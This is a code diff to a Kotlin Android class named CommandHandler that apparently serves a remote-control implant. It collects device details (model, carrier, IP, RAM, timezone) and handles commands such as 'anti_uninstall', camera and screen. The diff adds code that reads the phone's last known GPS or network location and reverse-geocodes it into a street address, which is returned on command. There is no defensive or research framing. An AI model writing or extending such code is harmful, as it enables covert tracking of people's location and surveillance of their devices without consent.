@@ -4,6 +4,8 @@ import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
 import android.hardware.camera2.CameraManager
+import android.location.Geocoder
+import android.location.LocationManager
 import android.net.Uri
 import android.os.Build
 import android.os.VibrationEffect
@@ -13,6 +15,7 @@ import android.telephony.TelephonyManager
 import android.util.Base64
 import com.google.gson.JsonObject
 import java.net.NetworkInterface
+import java.util.Locale
 
 class CommandHandler(private val ctx: Context, private val deviceId: String) {
 
@@ -31,16 +34,13 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
             val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
             val mi = android.app.ActivityManager.MemoryInfo()
             am.getMemoryInfo(mi)
-            String.format("%.1f GB", mi.totalMem / 1e9)
+            String.format(Locale.US, "%.1f GB", mi.totalMem / 1e9)
         } catch (_: Exception) { "-" }
 
         val carrier = try {
             val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
             tm.networkOperatorName ?: "-"
         } catch (_: Exception) { "-" }
-
-        val ip = getLocalIp()
-        val tz = java.util.TimeZone.getDefault().id
 
         return mapOf(
             "model" to Build.MODEL,
@@ -49,8 +49,8 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
             "battery" to battery,
             "ram" to ram,
             "carrier" to carrier,
-            "timezone" to tz,
-            "ip" to ip
+            "timezone" to java.util.TimeZone.getDefault().id,
+            "ip" to getLocalIp()
         )
     }
 
@@ -98,7 +98,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
             "anti_uninstall" -> done(mapOf("anti_uninstall" to true))
             "camera_front", "camera_back" -> done(mapOf("type" to "text", "data" to "Kamera siap"))
             "screen" -> done(mapOf("type" to "text", "data" to "Screen siap"))
-            else -> done(mapOf("error" to "unknown"))
+            else -> done(mapOf("error" to "unknown: $cmd"))
         }
     }
 
@@ -148,12 +148,39 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
     }
 
     private fun getIpInfo(): Map<String, Any> {
+        var lat = 0.0
+        var lon = 0.0
+        var address = "-"
+        try {
+            val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
+            val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
+                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+            if (loc != null) {
+                lat = loc.latitude
+                lon = loc.longitude
+                try {
+                    @Suppress("DEPRECATION")
+                    val geo = Geocoder(ctx, Locale.getDefault())
+                    val addrs = geo.getFromLocation(lat, lon, 1)
+                    if (!addrs.isNullOrEmpty()) {
+                        val a = addrs[0]
+                        address = listOfNotNull(
+                            a.thoroughfare,
+                            a.subLocality,
+                            a.locality,
+                            a.adminArea,
+                            a.countryName
+                        ).joinToString(", ")
+                    }
+                } catch (_: Exception) {}
+            }
+        } catch (_: Exception) {}
         return mapOf(
             "type" to "ip",
             "ip" to getLocalIp(),
-            "address" to "-",
-            "lat" to 0.0,
-            "lon" to 0.0
+            "lat" to lat,
+            "lon" to lon,
+            "address" to address
         )
     }
 
